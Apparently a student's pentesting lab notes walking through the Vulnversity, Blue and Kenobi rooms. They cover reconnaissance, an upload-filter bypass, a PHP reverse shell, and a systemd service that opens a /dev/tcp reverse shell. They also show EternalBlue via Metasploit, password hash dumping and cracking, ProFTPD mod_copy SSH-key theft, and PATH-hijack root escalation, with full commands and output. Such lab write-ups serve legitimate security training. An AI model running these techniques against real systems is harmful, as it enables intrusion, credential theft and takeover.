# Offensive Pentesting

[TOC]

## Vulnversity

### Reconnaissance with `Nmap`

- `-sV`: determine the version of services running
- `-p <PORT_NUMBER>`: port scan
- `-p-`: scans for all ports
- `-p1-200`: scans for ports from 1 to 200
- `-Pn`: disable *host discovery* and scan for open ports
- `-A`: enables OS and version detection, executes in-build scripts for further enumeration

### Locating directories using `Gobuster`

- With `Gobuster`, we will locate a directory to which we can use to upload a shell
- Need a wordlist, can find many under `/usr/share/wordlists` in Kali
- `gobuster dir -u <URL> -w <WORDLIST>`
    - `dir` specifies the mode: directory and file enumeration
    - `-u <URL>` the URL of the target web server
    - `-w <WORDLIST>` specifies the wordlist path
- Other flags
    - `-U` and `-P`: specifies the username and password for authentication
    - `-p <x>`: proxy to use for requests
    - `-c <HTTP_COOKIES>`: specifies a cookie for simulating auth
- By default, `gobuster` will only search for 1 layer of directory

### Compromising the Webserver

- After finding a form to upload files, we can leverage it to upload and execute our payload
- Fuzzing the upload form to identify which extensions are not blocked with `BurpSuite`
    - Use intruder (used for automating customised attacks). To begin, make a wordlist with possible extensions

        ```
        .php
        .php3
        .php4
        .php5
        .phtml
        ```
- Then, we upload any file and intercept the request, send it to the intruder, choose `Sniper` as attack type
- In the payload, embrace the file extension (`.*`) with `§`, e.g., `file§.php§`
- Paste the extension list to payload settings, and start attack
- Take care of the `URL-encode these characters` option in "Payload encoding", and do not URL-encode the `.` character

### Getting a Reverse Shell

- Prepare a reverse PHP shell, name it as `php-reverse-shell.phtml`
- Upload this file, listen to port 1234 (`nc -lvnp 1234`), and visit `http://<TARGET_IP>:3333/internal/uploads/php-reverse-shell.phtml`, this will get the payload executed

    ```bash
    # nc -lvnp 1234
    Listening on [0.0.0.0] (family 0, port 1234)
    Connection from 10.10.39.75 47710 received!
    Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
    06:43:12 up 27 min,  0 users,  load average: 0.00, 0.04, 0.07
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    $ 
    ```

### Privilege Escalation

- We got a reverse shell, but as an unprivileged user (`www-data`). We will escalate our privileges to become the root user
- Search for Set-UID files: `find / -perm /4000 -type f 2>/dev/null`
- We found Set-UID program `/bin/systemctl`, which can be used to start a service with the root privilege
- Prepare a service `escalation.service`

    ```
    [Unit]
    Description=escalator

    [Service]
    Type=simple
    User=root
    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.35.6/9999 0>&1'

    [Install]
    WantedBy=multi-user.target
    ```
- Find a directory where we are able to write so that we can create the service file, we can use `/dev/shm`: 

    ```shell
    $ find / -maxdepth 2 -type d -writable
    /run/php
    /run/lock
    find: '/lost+found': Permission denied
    /var/tmp
    /var/crash
    /tmp
    /tmp/.font-unix
    /tmp/.ICE-unix
    /tmp/.X11-unix
    /tmp/.XIM-unix
    /tmp/.Test-unix
    /dev/mqueue
    /dev/shm
    find: '/root': Permission denied
    ```

- It is not convenient to edit file (e.g., using `vi`) in the reverse shell, we can prepare the following commands and paste them to the shell

    ```shell
    echo "[Unit]" > /dev/shm/escalation.service
    echo "Description=escalator" >> /dev/shm/escalation.service
    echo "[Service]" >> /dev/shm/escalation.service
    echo "Type=simple" >> /dev/shm/escalation.service
    echo "User=root" >> /dev/shm/escalation.service
    echo "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.35.6/22222 0>&1'" >> /dev/shm/escalation.service
    echo "[Install]" >> /dev/shm/escalation.service
    echo "WantedBy=multi-user.target" >> /dev/shm/escalation.service
    cat /dev/shm/escalation.service
    ```

- **Important**: on the attack machine, listening to port `22222` before start the service on the victim machine
- Start the service 

    ```shell
    $ /bin/systemctl enable /dev/shm/escalation.service
    Created symlink from /etc/systemd/system/multi-user.target.wants/escalation.service to /dev/shm/escalation.service.
    Created symlink from /etc/systemd/system/escalation.service to /dev/shm/escalation.service.
    $ /bin/systemctl start escalation
    ```

- On the attack machine

    ```shell
    # nc -lvnp 22222
    Listening on [0.0.0.0] (family 0, port 22222)
    Connection from 10.10.39.75 34242 received!
    bash: cannot set terminal process group (2215): Inappropriate ioctl for device
    bash: no job control in this shell
    root@vulnuniversity:/# 
    root@vulnuniversity:/# cat ~/root.txt <-- get the root flag
    ```

## Blue

### Recon with `Nmap`

- `nmap -sV -sC --script vuln -oN blue.map 10.10.92.115`
    - `-sV`: Version detection. This option tells Nmap to probe open ports to determine what service and version is running
    - `-sC`: This option runs a collection of Nmap Scripting Engine (NSE) scripts that are considered to be safe and useful for general scanning. It is equivalent to `--script=default`
    - `-script vuln`: This option specifies to run all scripts in the vuln category, which are used to check for known vulnerabilities on the target
    - `-oN blue.map`: This option tells Nmap to output the results of the scan in normal format to a file named `blue.map`

    ```shell
    Host script results:
    |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
    |_smb-vuln-ms10-054: false
    |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
    | smb-vuln-ms17-010: 
    |   VULNERABLE:
    |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2017-0143
    |     Risk factor: HIGH
    |       A critical remote code execution vulnerability exists in Microsoft SMBv1
    |        servers (ms17-010).
    |           
    |     Disclosure date: 2017-03-14
    |     References:
    |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
    |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
    ```

### Gain access with `Metasploit`

- Start `Metasploit`: `# msfconsole`
- Search for the exploit for `ms17-010`:

    ```shell
    msf6 > search ms17-010

    Matching Modules
    ================

    #  Name                                      Disclosure Date  Rank     Check  Description
    -  ----                                      ---------------  ----     -----  -----------
    0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
    1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
    2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
    3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
    4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
    ```

- Choose exploit, and show options, set `RHOSTS`, and set the payload

    ```shell
    msf6 > use exploit/windows/smb/ms17_010_eternalblue
    [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
    msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
    ...
    msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.177.201
    RHOSTS => 10.10.177.201
    msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
    payload => windows/x64/shell/reverse_tcp
    ```

- Run the exploit (and get a reverse shell):
    
    ```shell
    msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
    ...
    Shell Banner:
    Microsoft Windows [Version 6.1.7601]
    -----
            

    C:\Windows\system32>
    ```

### Escalate

- The next step is to get the root privilege
- Background the previously gained shell with `Ctrl+Z`
- Convert a shell to meterpreter shell in `Metasploit` (A *Meterpreter shell* is a powerful, dynamic, and extensible payload within the Metasploit Framework. It provides an interactive shell that allows penetration testers to execute commands on a target system with advanced features and capabilities that go beyond a traditional command shell)
    1. Load the shell to Meterpreter module: `use post/multi/manage/shell_to_meterpreter`
    2. Find the correct session, set `SESSION`, and run this module: 
        
        ```shell
        msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

        Active sessions
        ===============

        Id  Name  Type               Information                                               Connection
        --  ----  ----               -----------                                               ----------
        1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.10.95.106:4444 -> 10.10.177.201:49207 (10.10.177.201)

        msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
        SESSION => 1
        msf6 post(multi/manage/shell_to_meterpreter) > run

        [*] Upgrading session ID: 1
        [*] Starting exploit/multi/handler
        [*] Started reverse TCP handler on 10.10.95.106:4433 
        [*] Post module execution completed
        msf6 post(multi/manage/shell_to_meterpreter) > 
        [*] Sending stage (200774 bytes) to 10.10.177.201
        [*] Meterpreter session 2 opened (10.10.95.106:4433 -> 10.10.177.201:49223) at 2024-07-24 12:21:27 +0100
        [*] Stopping exploit/multi/handler

        msf6 post(multi/manage/shell_to_meterpreter) >
        ```

    3. Now we have another session

        ```shell
        msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

        Active sessions
        ===============

        Id  Name  Type                     Information                                               Connection
        --  ----  ----                     -----------                                               ----------
        1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.10.95.106:4444 -> 10.10.177.201:49207 (10.10.177.201)
        2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC 


        ```
    
    4. Back to the DOS shell to see who I am

        ```shell
        msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 1
        [*] Starting interaction with 1...


        Shell Banner:
        Microsoft Windows [Version 6.1.7601]
        -----
                

        C:\Windows\system32>
        C:\Windows\system32>getsystem
        getsystem
        'getsystem' is not recognized as an internal or external command,
        operable program or batch file.

        C:\Windows\system32>whoami
        whoami
        nt authority\system
        ```
    
    5. Background this DOS shell again, and select the meterpreter session (`SESSION=2`)

        ```shell
        msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
        [*] Starting interaction with 2...

        meterpreter > ps

        Process List
        ============

        PID   PPID  Name                  Arch  Session  User                          Path
        ---   ----  ----                  ----  -------  ----                          ----
        0     0     [System Process]
        4     0     System                x64   0
        352   556   conhost.exe           x64   0        NT AUTHORITY\SYSTEM 
        ...
        ```
    
    6. Migrate a process that is running at `NT AUTHORITY\SYSTEM`, this process might not be stable. (The `migrate` command in a Meterpreter session allows you to move the current Meterpreter session from one process to another on the target system. This is particularly useful for maintaining persistence, avoiding detection, and ensuring stability of the session). This will take several attempts, and if it fails, we will need to re-run the conversion process or reboot the machine (and try a different process)

        ```shell
        meterpreter > migrate 1288
        [*] Migrating from 1904 to 1288...
        [*] Migration completed successfully.
        ```

### Cracking

- Run `hashdump` in the Meterpreter. This will dump all of the passwords on the machine

    ```shell
    meterpreter > hashdump
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
    ```
- Save `Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::` in a file (e.g., `hash.txt`), and use some password cracking tool to get the password. Use `john`. The plaintext is `alqfna22`

    ```shell
    root@ip-10-10-95-106:~# john hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
    Warning: no OpenMP support for this hash type, consider --fork=2
    Press 'q' or Ctrl-C to abort, almost any other key for status
    alqfna22         (Jon)
    1g 0:00:00:06 DONE (2024-07-24 13:03) 0.1455g/s 1484Kp/s 1484Kc/s 1484KC/s alr1979..alpus
    Use the "--show --format=NT" options to display all of the cracked passwords reliably
    Session completed. 
    root@ip-10-10-95-106:~# john hash.txt --format=NT --show
    Jon:alqfna22:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

    1 password hash cracked, 0 left
    ```

### Find flags!

- Find 3 flags planted at 3 key locations within the Windows system
- Flag 1: `C:\flag1.txt` (at the system root)
- Flag 2: `C:\Windows\System32\config\flag2.txt` (the location where passwords are stored within Windows)
- Flag 3: `C:\Users\Jon\Documents\flag3.txt` (a location where administrators usually have pretty interesting things saved), in this target machine, `Jon` is the administrator, we can verify this using `net localgroup Administrators`

    ```shell
    C:\Users\Jon\Documents>net localgroup Administrators
    net localgroup Administrators
    Alias name     Administrators
    Comment        Administrators have complete and unrestricted access to the computer/domain

    Members

    -------------------------------------------------------------------------------
    Administrator
    Jon
    The command completed successfully.
    ```

## Kenobi

- Exploiting a Linux machine, accessing a Samba share, manipulating a vulnerable version of ProFTPD to gain initial access and escalate your privileges to root via an SUID binary
    - **Samba** is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system. Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network
    - **ProFtpd (Pro FTP Daemon)** is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions

### Enumerating Samba for shares

- SMB has two ports, `445` and `139`, SMB after Windows 2000 uses port `445` on top of a TCP stack. Using TCP allows SMB to work over the Internet

    ```shell
    # nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.180.135

    Starting Nmap 7.60 ( https://nmap.org ) at 2024-07-25 05:24 BST
    Nmap scan report for ip-10-10-180-135.eu-west-1.compute.internal (10.10.180.135)
    Host is up (0.00012s latency).

    PORT    STATE SERVICE
    445/tcp open  microsoft-ds
    MAC Address: 02:3F:3A:2E:19:31 (Unknown)

    Host script results:
    | smb-enum-shares: 
    |   account_used: guest
    |   \\10.10.180.135\IPC$: 
    |     Type: STYPE_IPC_HIDDEN
    |     Comment: IPC Service (kenobi server (Samba, Ubuntu))
    |     Users: 2
    |     Max Users: <unlimited>
    |     Path: C:\tmp
    |     Anonymous access: READ/WRITE
    |     Current user access: READ/WRITE
    |   \\10.10.180.135\anonymous: 
    |     Type: STYPE_DISKTREE
    |     Comment: 
    |     Users: 0
    |     Max Users: <unlimited>
    |     Path: C:\home\kenobi\share
    |     Anonymous access: READ/WRITE
    |     Current user access: READ/WRITE
    |   \\10.10.180.135\print$: 
    |     Type: STYPE_DISKTREE
    |     Comment: Printer Drivers
    |     Users: 0
    |     Max Users: <unlimited>
    |     Path: C:\var\lib\samba\printers
    |     Anonymous access: <none>
    |_    Current user access: <none>
    ```

- Inspect one of the shares

    ```shell
    # smbclient //10.10.180.135/anonymous
    WARNING: The "syslog" option is deprecated
    Enter WORKGROUP\root's password: 
    Try "help" to get a list of possible commands.
    smb: \> ls
    .                                   D        0  Wed Sep  4 11:49:09 2019
    ..                                  D        0  Wed Sep  4 11:56:07 2019
    log.txt                             N    12237  Wed Sep  4 11:49:09 2019

            9204224 blocks of size 1024. 6877120 blocks available
    ```

- We can recursively download the SMB share (no password, press `Enter`): `smbget -R smb://10.10.180.135/anonymous`. We can find the FTP port in `log.txt`

    ```
    ...
    ServerName			"ProFTPD Default Installation"
    ServerType			standalone
    DefaultServer			on

    # Port 21 is the standard FTP port.
    Port				21

    # Don't use IPv6 support by default.
    UseIPv6				off
    ...
    ```

- By port scanning, we can know that port `111` is running `rpcbind` service. When an RPC service is started, it tells `rpcbind` the address at which it is listening and the RPC program number it is prepared to serve
- In our case, port `111` is access to a network file system. Use `nmap` to enumerate this

    ```shell
    # nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.115.178
    ...
    PORT    STATE SERVICE
    111/tcp open  rpcbind
    | nfs-ls: Volume /var
    |   access: Read Lookup NoModify NoExtend NoDelete NoExecute
    | PERMISSION  UID  GID  SIZE  TIME                 FILENAME
    | rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
    | rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
    | rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
    | rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
    | rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
    | rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
    | rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
    | rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
    | rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
    | rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
    |_
    | nfs-showmount: 
    |_  /var *
    | nfs-statfs: 
    |   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
    |_  /var        9204224.0  1836516.0  6877112.0  22%   16.0T        32000
    MAC Address: 02:A8:AF:4A:EC:A7 (Unknown)
    ...
    ```

### Get initial access with ProFTPD

- Use `netcat` to connect to the machine on the FTP port: `nc 10.10.115.178 21` (We got this port number from `log.txt` downloaded by `smbget` command)
- We can use `Searchsploit`, a command line search tool for `exploit-db.com`, to find exploits for a particular software version

    ```shell
    # searchsploit proftpd 1.3.5
    ---------------------------------------------- ---------------------------------
    Exploit Title                                |  Path
    ---------------------------------------------- ---------------------------------
    ProFTPd 1.3.5 - 'mod_copy' Command Execution  | linux/remote/37262.rb
    ProFTPd 1.3.5 - 'mod_copy' Remote Command Exe | linux/remote/36803.py
    ProFTPd 1.3.5 - 'mod_copy' Remote Command Exe | linux/remote/49908.py
    ProFTPd 1.3.5 - File Copy                     | linux/remote/36742.txt
    ---------------------------------------------- ---------------------------------
    Shellcodes: No Results
    ```


- ProFtpd's `mod_copy` module implements `SITE CPFR` and `SITE CPTO` commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination
- We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. We can copy Kenobi's private key using `SITE CPFR` and `SITE CPTO`

    ```shell
    # nc 10.10.115.178 21
    220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.115.178]
    SITE CPFR /home/kenobi/.ssh/id_rsa
    350 File or directory exists, ready for destination name
    SITE CPTO /var/tmp/id_rsa
    250 Copy successful
    ```

- `/var` is a mount that we can see. Mount `/var` to our machine `/target_var`

    ```shell
    # mkdir /target_var
    # mount 10.10.115.178:/var /target_var
    root@ip-10-10-165-226:~# ls -l /target_var
    total 48
    drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
    drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
    drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
    drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
    drwxrwsr-x  2 root staff 4096 Apr 12  2016 local
    lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
    drwxrwxr-x 10 root lxd   4096 Sep  4  2019 log
    drwxrwsr-x  2 root mail  4096 Feb 26  2019 mail
    drwxr-xr-x  2 root root  4096 Feb 26  2019 opt
    lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
    drwxr-xr-x  2 root root  4096 Jan 29  2019 snap
    drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
    drwxrwxrwt  6 root root  4096 Jul 25 11:43 tmp
    drwxr-xr-x  3 root root  4096 Sep  4  2019 www
    ```

- With the private key, we can `ssh` login to `kenobi@10.10.115.178`, and see the user flag. We need to set the permission of `id_rsa` to `600` (not readable to other users)

    ```shell
    # cp /target_var/tmp/id_rsa .
    # chmod 600 id_rsa
    root@ip-10-10-165-226:~# ssh -i id_rsa kenobi@10.10.115.178
    Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

    * Documentation:  https://help.ubuntu.com
    * Management:     https://landscape.canonical.com
    * Support:        https://ubuntu.com/advantage

    103 packages can be updated.
    65 updates are security updates.


    Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
    To run a command as administrator (user "root"), use "sudo <command>".
    See "man sudo_root" for details.

    kenobi@kenobi:~$ cat ~/user.txt 
    d0b0f3f53b6caa532a83915e19224899
    ```

### Privilege Escalation with Path Variable Manipulation

- We can use a Set-UID root program to escalate privilege. To find one, use `find / -perm -u=s -type f 2>/dev/null`

    ```shell
    $ find / -perm -u=s -type f 2>/dev/null
    /sbin/mount.nfs
    /usr/lib/policykit-1/polkit-agent-helper-1
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/snapd/snap-confine
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/openssh/ssh-keysign
    /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
    /usr/bin/chfn
    /usr/bin/newgidmap
    /usr/bin/pkexec
    /usr/bin/passwd
    /usr/bin/newuidmap
    /usr/bin/gpasswd
    /usr/bin/menu
    /usr/bin/sudo
    /usr/bin/chsh
    /usr/bin/at
    /usr/bin/newgrp
    /bin/umount
    /bin/fusermount
    /bin/mount
    /bin/ping
    /bin/su
    /bin/ping6
    ```

- Use `/usr/bin/menu`

    ```shell
    $ /usr/bin/menu

    ***************************************
    1. status check
    2. kernel version
    3. ifconfig
    ** Enter your choice :
    ```

- Use `strings` command to search for human redable strings on a binary. We can know that inside this binary, it runs some commands without using their absolute path. If we manipulate the PATH environment variable, we can get `/usr/bin/menu` to execute any programs on the system

    ```shell
    $ strings /usr/bin/menu
    ...
    curl -I localhost
    uname -r
    ifconfig
    ...
    ```

- Escalation (in some newer versions of Linux, all shell programs, e.g., `bash`, `zsh`, etc., have a countermeasure that drops root privilege when executed by a Set-UID root program)

    ```shell
    kenobi@kenobi:~$ echo /bin/sh > curl
    kenobi@kenobi:~$ chmod 777 curl
    kenobi@kenobi:~$ export PATH=/home/kenobi:$PATH
    kenobi@kenobi:~$ /usr/bin/menu

    ***************************************
    1. status check
    2. kernel version
    3. ifconfig
    ** Enter your choice :1
    # whoami
    root
    # cat /root/root.txt
    177b3cd8562289f37382721c28381f02
    ```
